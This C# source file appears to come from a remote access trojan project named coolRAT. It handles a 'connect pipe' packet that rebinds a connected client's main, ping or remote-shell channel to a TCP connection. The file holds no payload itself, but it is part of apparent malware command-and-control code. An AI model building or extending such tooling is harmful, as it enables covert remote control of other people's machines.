using coolRAT.Libs.Packets;
using System;
using System.Collections.Generic;
using System.Text;

namespace coolRAT.Libs.PacketProcessors
{
    public class ConnectPipePacket_PacketProcessor
    {
        TcpConnection Connection;
        ConnectPipePacket Packet;
        Dictionary<Guid, Client> ConnectedClients;

        public ConnectPipePacket_PacketProcessor(TcpConnection connection, ConnectPipePacket packet, Dictionary<Guid, Client> connectedClients)
        {
            Connection = connection;
            Packet = packet;
            ConnectedClients = connectedClients;
        }

        public ConnectPipePacket_PacketProcessor(TcpConnection connection, ConnectPipePacket packet, Client client)
        {
            Connection = connection;
            Packet = packet;
            ConnectedClients = new Dictionary<Guid, Client>
            {
                { client.UniqueId, client }
            };
        }

        public bool Process()
        {
            if (!ConnectedClients.ContainsKey(Packet.ClientId))
            {
                PipeConnectedPacket result_fail = new PipeConnectedPacket(Packet.ClientId, Packet.PipeType, false);
                Connection.SendPacket(result_fail);
                return false;
            }

            switch (Packet.PipeType)
            {
                case PipeType.Main:
                    Console.WriteLine($"Main pipe of client {Packet.ClientId} rebound successfully.");
                    ConnectedClients[Packet.ClientId].Pipes.MainPipe = Connection;
                    break;
                case PipeType.Ping:
                    Console.WriteLine($"Ping pipe of client {Packet.ClientId} rebound successfully.");
                    ConnectedClients[Packet.ClientId].Pipes.PingPipe = Connection;
                    break;
                case PipeType.Shell:
                    Console.WriteLine($"Shell pipe of client {Packet.ClientId} rebound successfully.");
                    ConnectedClients[Packet.ClientId].Pipes.ShellPipe = Connection;
                    break;
            }
            PipeConnectedPacket result_success = new PipeConnectedPacket(Packet.ClientId, Packet.PipeType, true);
            Connection.SendPacket(result_success);
            return true;
        }
    }
}
